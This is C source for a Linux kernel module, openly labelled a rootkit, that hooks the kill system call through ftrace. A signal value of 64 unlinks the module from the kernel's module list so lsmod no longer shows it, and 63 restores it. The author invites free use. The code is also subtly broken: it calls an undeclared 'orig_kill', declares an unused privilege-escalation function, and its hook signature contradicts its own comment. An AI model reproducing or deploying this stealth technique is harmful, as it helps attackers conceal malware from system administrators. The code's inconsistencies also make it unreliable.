/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary library includes
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/kallsyms.h>
#include "lib/ftrace_helper2.h"

//setting up moudle information for kernel module
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sean Kannanaikal");
MODULE_DESCRIPTION("You have been trapped in a genjutsu");
MODULE_VERSION("0.01");

static asmlinkage long (*original_kill)(pid_t pid, int sig);

static struct list_head *previous_model;

/*
This function will simply alter the kernel linked list dat structure
for keeping track of kernel modules by deleting the current module
from the linked list
*/
void hideRootkit(void){
    previous_model = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

/*
This function will simply alter the kernel linked list data structure
for keeping track of kernel modules by adding the current module
back into the linked list
*/
void showRootkit(void){
    list_add(&THIS_MODULE->list, previous_model);
}

/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
kill and go through and hide the kernel module from being listed in lsmod listing
*/
static asmlinkage int hook_kill(pid_t pid, int sig){
    void hideRootkit(void);
    void elevatePrivilieges(void); 

    //if signal value of 64 passed in hiderootkit
    if(sig == 64){
        hideRootkit();
        return 0;
    }
    else if(sig == 63){
        showRootkit();
        return 0;
    }

    return orig_kill(pid, sig);
}
//array for defining hooks according to xcellerators ftrace helper library function
static struct ftrace_hook hooks[] = {
        HOOK("sys_kill", hook_kill, &original_kill),
};



//init function to run upon iitilaization of kernel module will install function hook
static int __init hide_kernel_module_init(void){
    int error; 
    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(error){
        return error;
    }
    return 0;
}

//exit function to run upon removal of kernel module will uninstall function hooks
static void __exit hide_kernel_module_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

//setting init and exit as corresponding functions for initalization and exit
module_init(hide_kernel_module_init);
module_exit(hide_kernel_module_exit);
